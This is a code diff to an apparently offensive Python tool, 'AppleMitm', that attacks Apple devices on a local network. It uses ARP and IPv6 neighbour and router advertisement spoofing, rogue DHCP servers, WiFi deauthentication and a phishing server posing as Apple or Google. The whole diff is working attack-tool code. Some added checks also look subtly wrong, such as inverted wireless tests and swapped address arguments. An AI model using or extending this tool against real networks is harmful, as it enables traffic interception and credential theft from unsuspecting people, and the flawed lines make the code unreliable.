@@ -128,6 +128,7 @@ class AppleMitm:
 
     # region ARP spoofing
     def _arp_spoof(self):
+        sleep(3)
         arp_spoof: ArpSpoof = ArpSpoof(network_interface=self._your['network-interface'])
         arp_spoof.start(gateway_ipv4_address=self._gateway['ipv4-address'],
                         target_ipv4_address=self._target['ipv4-address'],
@@ -137,6 +138,7 @@ class AppleMitm:
 
     # region NA spoofing
     def _na_spoof(self):
+        sleep(3)
         ipv6_spoof: IPv6Spoof = IPv6Spoof(network_interface=self._your['network-interface'])
         ipv6_spoof.start(technique=2,
                          target_ipv6_address=self._target['ipv6-address'],
@@ -148,6 +150,7 @@ class AppleMitm:
 
     # region RA spoofing
     def _ra_spoof(self):
+        sleep(3)
         ipv6_spoof: IPv6Spoof = IPv6Spoof(network_interface=self._your['network-interface'])
         ipv6_spoof.start(technique=1,
                          target_ipv6_address=self._target['ipv6-address'],
@@ -158,6 +161,7 @@ class AppleMitm:
 
     # region DHCPv4 server
     def _dhcpv4_server(self):
+        sleep(3)
         dhcpv4_server: DHCPv4Server = DHCPv4Server(network_interface=self._your['network-interface'])
         dhcpv4_server.start(target_mac_address=self._target['mac-address'],
                             target_ipv4_address=self._target['ipv4-address'],
@@ -168,6 +172,7 @@ class AppleMitm:
 
     # region DHCPv4 server for Apple devices
     def _apple_dhcpv4_server(self):
+        sleep(3)
         apple_dhcp_server: AppleDHCPServer = AppleDHCPServer(network_interface=self._your['network-interface'])
         apple_dhcp_server.start(target_ip_address=self._target['new-ipv4-address'],
                                 target_mac_address=self._target['mac-address'],
@@ -176,6 +181,7 @@ class AppleMitm:
 
     # region DHCPv6 server
     def _dhcpv6_server(self):
+        sleep(3)
         dhcpv6_server: DHCPv6Server = DHCPv6Server(network_interface=self._your['network-interface'])
         dhcpv6_server.start(target_mac_address=self._target['mac-address'],
                             target_ipv6_address=self._target['new-ipv6-address'],
@@ -249,7 +255,7 @@ class AppleMitm:
     def start(self,
               mitm_technique: Union[None, int] = None,
               disconnect_technique: Union[None, int] = None,
-              listen_interface: Union[None, str] = None,
+              mitm_interface: Union[None, str] = None,
               deauth_interface: Union[None, str] = None,
               target_mac_address: Union[None, str] = None,
               target_ipv4_address: Union[None, str] = None,
@@ -265,7 +271,7 @@ class AppleMitm:
         # region Variables
         thread_manager: ThreadManager = ThreadManager(10)
 
-        listen_network_interface: Union[None, str] = None
+        mitm_network_interface: Union[None, str] = None
         deauth_network_interface: Union[None, str] = None
 
         disconnect: bool = False
@@ -305,10 +311,10 @@ class AppleMitm:
             print(self._base.c_info + 'Set MiTM technique index from range (1 - ' +
                   str(len(self._mitm_techniques.keys())) + '): ', end='')
             _test_technique = input()
+            assert _test_technique.isdigit(), \
+                'MiTM technique index is not digit!'
         else:
             _test_technique = mitm_technique
-        assert _test_technique.isdigit(), \
-            'MiTM technique index is not digit!'
         self._mitm_technique = \
             self._utils.check_value_in_range(value=int(_test_technique),
                                              first_value=1, last_value=len(self._mitm_techniques),
@@ -326,10 +332,10 @@ class AppleMitm:
             print(self._base.c_info + 'Set Disconnect technique index from range (1 - ' +
                   str(len(self._disconnect_techniques.keys())) + '): ')
             _test_technique = input()
+            assert _test_technique.isdigit(), \
+                'Disconnect technique index is not digit!'
         else:
             _test_technique = disconnect_technique
-        assert _test_technique.isdigit(), \
-            'Disconnect technique index is not digit!'
         self._utils.check_value_in_range(value=int(_test_technique),
                                          first_value=1, last_value=len(self._disconnect_techniques),
                                          parameter_name='Disconnect technique')
@@ -362,24 +368,24 @@ class AppleMitm:
         # endregion
 
         # region Get listen network interface, your IP address, first and last IP in local network
-        listen_network_interface = \
-            self._base.network_interface_selection(interface_name=listen_interface,
+        mitm_network_interface = \
+            self._base.network_interface_selection(interface_name=mitm_interface,
                                                    message='Please select a network interface for '
                                                            'MiTM Apple devices from table: ')
-        self._your = self._base.get_interface_settings(interface_name=listen_network_interface,
+        self._your = self._base.get_interface_settings(interface_name=mitm_network_interface,
                                                        required_parameters=['mac-address', 'ipv4-address'])
         if self._your['ipv6-link-address'] is None:
             self._your['ipv6-link-address'] = self._base.make_ipv6_link_address(self._your['mac_address'])
 
-        self._icmpv6_scan = ICMPv6Scan(network_interface=listen_network_interface)
-        self._scanner = Scanner(network_interface=listen_network_interface)
+        self._icmpv6_scan = ICMPv6Scan(network_interface=mitm_network_interface)
+        self._scanner = Scanner(network_interface=mitm_network_interface)
         # endregion
 
         # region Set IPv4 DNS server
         if self._mitm_technique in [1, 2, 3]:
             if dns_ipv4_address is not None:
                 self._dns_server['ipv4-address'] = \
-                    self._utils.check_ipv4_address(network_interface=listen_network_interface,
+                    self._utils.check_ipv4_address(network_interface=mitm_network_interface,
                                                    ipv4_address=dns_ipv4_address,
                                                    is_local_ipv4_address=False,
                                                    parameter_name='DNS server IPv4 address')
@@ -391,7 +397,7 @@ class AppleMitm:
         if self._mitm_technique in [4, 5, 6]:
             if dns_ipv6_address is not None:
                 self._dns_server['ipv6-address'] = \
-                    self._utils.check_ipv6_address(network_interface=listen_network_interface,
+                    self._utils.check_ipv6_address(network_interface=mitm_network_interface,
                                                    ipv6_address=gateway_ipv6_address,
                                                    is_local_ipv6_address=False,
                                                    parameter_name='gateway IPv6 address')
@@ -403,14 +409,14 @@ class AppleMitm:
         if self._mitm_technique in [1, 2, 3]:
             if gateway_ipv4_address is not None:
                 self._gateway['ipv4-address'] = \
-                    self._utils.check_ipv4_address(network_interface=listen_network_interface,
+                    self._utils.check_ipv4_address(network_interface=mitm_network_interface,
                                                    ipv4_address=gateway_ipv4_address,
                                                    is_local_ipv4_address=True,
                                                    parameter_name='gateway IPv4 address')
             else:
                 if self._mitm_technique == 1:
                     assert self._your['ipv4-gateway'] is not None, \
-                        'Network interface: ' + self._base.error_text(listen_network_interface) + \
+                        'Network interface: ' + self._base.error_text(mitm_network_interface) + \
                         ' does not have IPv4 gateway!'
                     self._gateway['ipv4-address'] = self._your['ipv4-gateway']
                 else:
@@ -421,7 +427,7 @@ class AppleMitm:
         if self._mitm_technique in [4, 5, 6]:
             if gateway_ipv6_address is not None:
                 self._gateway['ipv6-address'] = \
-                    self._utils.check_ipv6_address(network_interface=listen_network_interface,
+                    self._utils.check_ipv6_address(network_interface=mitm_network_interface,
                                                    ipv6_address=gateway_ipv6_address,
                                                    is_local_ipv6_address=True,
                                                    parameter_name='gateway IPv6 address')
@@ -435,7 +441,7 @@ class AppleMitm:
 
                     assert _router_advertisement_data is not None, \
                         'Can not find IPv6 gateway in local network on interface: ' + \
-                        self._base.error_text(listen_network_interface)
+                        self._base.error_text(mitm_network_interface)
 
                     self._gateway['ipv6-address'] = _router_advertisement_data['router_ipv6_address']
 
@@ -459,14 +465,20 @@ class AppleMitm:
             deauth = True
 
         if deauth:
+            assert mitm_network_interface not in self._base.list_of_wireless_network_interfaces(), \
+                'Network interface: ' + self._base.error_text(mitm_network_interface) + ' is not Wireless!'
+
+            assert self._your['essid'] is None or self._your['bssid'] is None or self._your['channel'] is None, \
+                'Network interface: ' + self._base.error_text(mitm_network_interface) + ' does not connect to AP!'
+
             # region Set network interface for send wifi deauth packets
             deauth_network_interface = \
                 self._base.network_interface_selection(interface_name=deauth_interface,
                                                        message='Please select a network interface for '
                                                                'send WiFi deauth packets from table: ')
 
-            assert listen_network_interface != deauth_network_interface, \
-                'Network interface for listening target requests: ' + self._base.info_text(listen_network_interface) + \
+            assert mitm_network_interface != deauth_network_interface, \
+                'Network interface for listening target requests: ' + self._base.info_text(mitm_network_interface) + \
                 ' and network interface for send WiFi deauth packets: ' + self._base.info_text(deauth_network_interface) + \
                 ' must be differ!'
             # endregion
@@ -476,13 +488,13 @@ class AppleMitm:
         # region Check wireless network interface for send wifi deauth packets
         if deauth:
             self._wifi = WiFi(wireless_interface=deauth_network_interface,
-                              wifi_channel=1, debug=False, start_scan=False)
+                              wifi_channel=self._your['channel'], debug=False, start_scan=False)
         # endregion
 
         # region Set target IPv4 address
         if self._mitm_technique in [1, 2, 3]:
             self._target = \
-                self._utils.set_ipv4_target(network_interface=listen_network_interface,
+                self._utils.set_ipv4_target(network_interface=mitm_network_interface,
                                             target_ipv4_address=target_ipv4_address,
                                             target_mac_address=target_mac_address,
                                             target_vendor='apple',
@@ -491,10 +503,10 @@ class AppleMitm:
         # endregion
 
         # region Set target new IPv4 address
-        if self._mitm_technique == 2:
+        if self._mitm_technique == 3:
             if target_new_ipv4_address is not None:
                 self._target['new-ipv4-address'] = \
-                    self._utils.check_ipv4_address(network_interface=listen_network_interface,
+                    self._utils.check_ipv4_address(network_interface=mitm_network_interface,
                                                    ipv4_address=target_new_ipv4_address,
                                                    is_local_ipv4_address=True,
                                                    parameter_name='target new IPv4 address')
@@ -506,7 +518,7 @@ class AppleMitm:
         # region Set target IPv6 address
         if self._mitm_technique in [4, 5, 6]:
             self._target = \
-                self._utils.set_ipv6_target(network_interface=listen_network_interface,
+                self._utils.set_ipv6_target(network_interface=mitm_network_interface,
                                             target_ipv6_address=target_ipv6_address,
                                             target_mac_address=target_mac_address,
                                             target_vendor='apple',
@@ -518,7 +530,7 @@ class AppleMitm:
         if self._mitm_technique == 4:
             if target_new_ipv6_address is not None:
                 self._target['new-ipv6-address'] = \
-                    self._utils.check_ipv6_address(network_interface=listen_network_interface,
+                    self._utils.check_ipv6_address(network_interface=mitm_network_interface,
                                                    ipv6_address=target_new_ipv4_address,
                                                    is_local_ipv6_address=False,
                                                    parameter_name='target new global IPv6 address')
@@ -528,8 +540,10 @@ class AppleMitm:
         # endregion
 
         # region General output
-        self._base.print_info('You chose MiTM technique: ', self._mitm_techniques[self._mitm_technique])
-        self._base.print_info('Network interface: ', listen_network_interface)
+        self._base.print_info('MiTM technique: ', self._mitm_techniques[self._mitm_technique])
+        self._base.print_info('Disconnect technique: ', self._disconnect_techniques[self._disconnect_technique])
+
+        self._base.print_info('Network interface: ', mitm_network_interface)
         self._base.print_info('Your MAC address: ', self._your['mac-address'])
 
         if self._mitm_technique in [1, 2, 3]:
@@ -556,23 +570,21 @@ class AppleMitm:
 
             self._base.print_info('Target IPv6 address: ', self._target['ipv6-address'])
 
-        #     if self._mitm_technique == 4:
-        #         self._base.print_info('First advertise IPv6 address: ', network_prefix_address + hex(first_suffix))
-        #         self._base.print_info('Last advertise IPv6 address: ', network_prefix_address + hex(last_suffix))
-        #
-        # if deauth:
-        #     self._base.print_info('Interface ', listen_network_interface,
-        #                           ' connected to: ', essid + ' (' + bssid + ')')
-        #     self._base.print_info('Interface ', listen_network_interface,
-        #                           ' channel: ', channel)
-        #     self._base.print_info('Interface ', listen_network_interface,
-        #                           ' frequency: ', freq)
-        #     self._base.print_info('Deauth network interface: ', deauth_network_interface)
+            if self._mitm_technique == 4:
+                self._base.print_info('Target new global IPv6 address: ', self._target['new-ipv6-address'])
+
+        if deauth:
+            self._base.print_info('Interface ', mitm_network_interface, ' connected to: ',
+                                  self._your['essid'] + ' (' + self._your['bssid'] + ')')
+            self._base.print_info('Interface ', mitm_network_interface, ' channel: ', self._your['channel'])
+            self._base.print_info('Deauth network interface: ', deauth_network_interface)
         # endregion
 
         # region Run DNS server
-        self._base.print_info('Start DNS server ...')
-        thread_manager.add_task(self._dns_server)
+        if self._dns_server['ipv4-address'] == self._your['ipv4-address'] or \
+                self._dns_server['ipv6-address'] == self._your['ipv6-link-address']:
+            self._base.print_info('Start DNS server ...')
+            thread_manager.add_task(self._start_dns_server)
         # endregion
 
         # region 1. ARP spoofing technique
@@ -607,8 +619,7 @@ class AppleMitm:
 
         # region Disconnect device
         if disconnect:
-            disconnect_device(listen_network_interface, target_ip_address, target_mac_address, deauth,
-                              deauth_network_interface, args.deauth_packets, channel, bssid)
+            thread_manager.add_task(self._disconnect_device)
         # endregion
 
         # region Start Phishing server
@@ -645,18 +656,21 @@ def main():
                              '\n3. Do not disconnect device after MiTM')
     parser.add_argument('-P', '--phishing_site', type=str, default='apple',
                         help='Set Phishing site "apple", "google" or Path to your site')
-    parser.add_argument('-l', '--listen_iface', type=str, help='Set interface name for listen packets')
+    parser.add_argument('-i', '--mitm_iface', type=str, help='Set interface name for MiTM')
     parser.add_argument('-d', '--deauth_iface', type=str, help='Set interface name for send wifi deauth packets')
     parser.add_argument('-0', '--deauth_packets', type=int, help='Set number of deauth packets (default: 5)',
                         default=5)
-    parser.add_argument('-g', '--gateway_ipv4', type=str, help='Set gateway IPv4 address', default=None)
-    parser.add_argument('-G', '--gateway_ipv6', type=str, help='Set gateway IPv6 address', default=None)
+    parser.add_argument('-g4', '--gateway_ipv4', type=str, help='Set gateway IPv4 address', default=None)
+    parser.add_argument('-g6', '--gateway_ipv6', type=str, help='Set gateway IPv6 address', default=None)
+    parser.add_argument('-d4', '--dns_ipv4', type=str, help='Set DNS server IPv4 address', default=None)
+    parser.add_argument('-d6', '--dns_ipv6', type=str, help='Set DNS server IPv6 address', default=None)
     parser.add_argument('-m', '--target_mac', type=str, help='Set target MAC address', default=None)
     parser.add_argument('-t4', '--target_ipv4', type=str, help='Set target IPv4 address', default=None)
     parser.add_argument('-n4', '--target_new_ipv4', type=str, help='Set new IPv4 address for target', default=None)
     parser.add_argument('-t6', '--target_ipv6', type=str, help='Set link local target IPv6 address', default=None)
-    parser.add_argument('--ipv6_prefix', type=str, help='Set IPv6 network prefix, default - fd00::/64',
-                        default='fd00::/64')
+    parser.add_argument('-n6', '--target_new_ipv6', type=str, help='Set new global IPv6 address for target', default=None)
+    parser.add_argument('--ipv6_prefix', type=str, help='Set IPv6 network prefix, default - fde4:8dba:82e1:ffff::/64',
+                        default='fde4:8dba:82e1:ffff::/64')
     args = parser.parse_args()
     # endregion
 
@@ -665,14 +679,18 @@ def main():
         apple_mitm: AppleMitm = AppleMitm()
         apple_mitm.start(mitm_technique=args.technique,
                          disconnect_technique=args.disconnect,
-                         listen_interface=args.listen_iface,
+                         mitm_interface=args.mitm_iface,
                          deauth_interface=args.deauth_iface,
                          target_mac_address=args.target_mac,
                          target_ipv4_address=args.target_ipv4,
                          target_new_ipv4_address=args.target_new_ipv4,
                          target_ipv6_address=args.target_ipv6,
+                         target_new_ipv6_address=args.target_new_ipv6,
                          gateway_ipv4_address=args.gateway_ipv4,
-                         gateway_ipv6_address=args.gateway_ipv6)
+                         gateway_ipv6_address=args.gateway_ipv6,
+                         dns_ipv4_address=args.dns_ipv4,
+                         dns_ipv6_address=args.dns_ipv6,
+                         ipv6_prefix=args.ipv6_prefix)
 
     except KeyboardInterrupt:
         base.print_info('Exit')
